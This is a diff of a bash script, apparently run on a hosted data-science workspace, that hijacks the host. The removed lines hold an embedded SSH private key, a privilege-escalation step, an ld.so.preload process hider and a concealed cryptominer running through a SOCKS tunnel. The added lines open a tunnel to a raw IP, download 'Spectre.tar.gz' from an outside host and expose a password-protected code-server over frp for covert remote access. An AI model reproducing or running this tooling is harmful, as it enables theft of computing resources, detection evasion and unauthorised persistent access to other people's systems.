@@ -1,15 +1,8 @@
 #!/bin/bash
-export TERM=linux
-
-export DEBIAN_FRONTEND=noninteractive
-DEBIAN_FRONTEND=noninteractive
-
-export LANGUAGE=en_US.UTF-8
-export LANG=en_US.UTF-8
-export LC_ALL=en_US.UTF-8
-
-LC_ALL=C
-
+cd
+sleep 2
+pwd
+sleep 2
 cat > gituser <<END
 -----BEGIN RSA PRIVATE KEY-----
 MIIJKQIBAAKCAgEAopp2kbGabw8YOZ7VnncnSR0Y9z5FtOveoQe7DDTO0AQj00Mf
@@ -68,71 +61,17 @@ sleep 2
 
 chmod 600 gituser
 
-git clone -c "core.sshCommand=ssh -i gituser -F /dev/null -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no" git@45.135.56.238:mygitfolder/project.git
+sleep 2
+
+ssh -i gituser -f -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 1081:0.0.0.0:8443 -D 1080 git@45.135.56.238
 
 sleep 2
 
-cd project
+curl -x socks5h://127.0.0.1:1080 http://greenleaf.teatspray.uk/Spectre.tar.gz -L -O -J
 
 sleep 2
 
-./system33 -S . /bin/bash
-
-su -
-
-LC_ALL=C
-
-sleep 2
-
-export TERM=linux
-
-export DEBIAN_FRONTEND=noninteractive
-DEBIAN_FRONTEND=noninteractive
-
-export LANGUAGE=en_US.UTF-8
-export LANG=en_US.UTF-8
-export LC_ALL=en_US.UTF-8
-
-
-
-sleep 2
-cd /
-sleep 2
-
-cp /home/cdsw/gituser /
-
-sleep 2
-
-cat > sshtunnel.sh <<END
-while true
-do
-PID=$(ps -ef | grep 'ssh -i gituser' | grep -v 'grep' | awk {'print $2'})
-if [ "$(curl -sL -x socks5h://127.0.0.1:1080 -w '%{http_code}' http://api.ipify.org -o /dev/null)" = "200" ]; then
-    echo "SSH Tunnel is still online"
-else
-    if [[ "" !=  "$PID" ]]; then
-      echo "killing SSH Tunnel process which is $PID"
-      kill -9 $PID
-	fi
-	ssh -i gituser -f -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 1081:0.0.0.0:8443 -D 1080 git@45.135.56.238
-	sleep 3
-	echo "Testing the Socks5"
-	curl -x socks5h://127.0.0.1:1080 api.ipify.org
-	echo " "
-fi
-sleep 60
-done
-END
-
-sleep 2
-
-chmod +x sshtunnel.sh
-
-sleep 2
-
-./sshtunnel.sh &
-
-#ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -f -N -L 1081:0.0.0.0:8443 -D 1080 root@45.135.56.238 
+tar -xf Spectre.tar.gz
 
 sleep 2
 
@@ -178,54 +117,33 @@ sleep 2
 
 sleep 2
 
-./update/update apt update
+curl -x socks5h://127.0.0.1:1082 -s -L -o code-server.tar.gz https://github.com/coder/code-server/releases/download/v4.97.2/code-server-4.97.2-linux-amd64.tar.gz
+sleep 2
+
+tar -xf code-server.tar.gz
+sleep 2
+
+export PATH=$HOME/code-server-4.97.2-linux-amd64/bin:$PATH
+sleep 2
+
+cat > ~/.config/code-server/config.yaml <<END
+bind-addr: 127.0.0.1:9090
+auth: password
+password: IhatePopUpsWut
+cert: false
+END
+
+sleep 2
+cat ~/.config/code-server/config.yaml
 
 sleep 2
 
-mkdir /etc/apt/preferences.d
-
-sleep 2
-
-mkdir /var/lib/dpkg/updates
-
-sleep 2
-apt update
-sleep 2
-
-export DEBIAN_FRONTEND=noninteractive
-DEBIAN_FRONTEND=noninteractive
-sleep 2
-
-./update/update apt-get install -y --no-install-recommends tzdata unzip libjansson-dev sudo screen > /dev/null
-
-sleep 2
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
-dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
-
-sleep 2
-
-TZ='Africa/Johannesburg'; export TZ
-date
-sleep 2
-
-./update/update wget -q http://greenleaf.teatspray.uk/magicGlove.zip
-sleep 2
-unzip magicGlove.zip
-sleep 2
-
-make
-sleep 2
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-
-mkdir /usr/local/lib
-sleep 2
+curl -x socks5h://127.0.0.1:1082 -s -k https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
+tar -xvf frp_0.48.0_linux_amd64.tar.gz
+# start from daemon
+cp frp_0.48.0_linux_amd64/frpc ~/
 
 
-mv libprocesshider.so /usr/local/lib/
-sleep 2
-
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 sleep 2
 
 array=()
@@ -235,9 +153,7 @@ for i in {a..z} {A..Z} {0..9};
 done
 
 currentdate=$(date '+%d-%b-%Y_Dera_')
-ipaddress=$(curl -s api.ipify.org)
-num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-used_num_of_cores=`expr $num_of_cores - 5`
+ipaddress=$(curl -x socks5h://127.0.0.1:1082 -s api.ipify.org)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 underscore="_"
 underscored_ip+=$underscore
@@ -246,18 +162,32 @@ currentdate+=$underscored_ip
 randomWord=$(printf %s ${array[@]::8} $'\n')
 currentdate+=$randomWord
 
-sleep 2
-
-echo ""
-echo "You will be using $used_num_of_cores cores"
-echo ""
+randomNumber=$(shuf -i 10000-65000 -n 1)
 
 sleep 2
 
-./update/update wget -q http://greenleaf.teatspray.uk/glove.tar.gz
+cat > frpc.ini <<END
+[common]
+server_addr = emergencyaccess.teatspray.uk
+server_port = 995
+
+[codeserver.$currentdate]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 9090
+remote_port = $randomNumber
+subdomain = $currentdate
+
+END
+
 sleep 2
 
-tar -xf glove.tar.gz
+echo "Your Codeserver connection details will be $currentdate.emergencyaccess.teatspray.uk:$randomNumber" 
+
 sleep 2
 
-./glove -a minotaurx -o stratum+tcp://coinxp.wot.mrface.com:8243 -u MBqp1j1SARjzcy5ukYdAuriCaFX2hDpNgK.$currentdate -p $currentdate,c=MAZA,zap=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./update/update ./frpc -c frpc.ini &
+
+sleep 2
+
+code-server
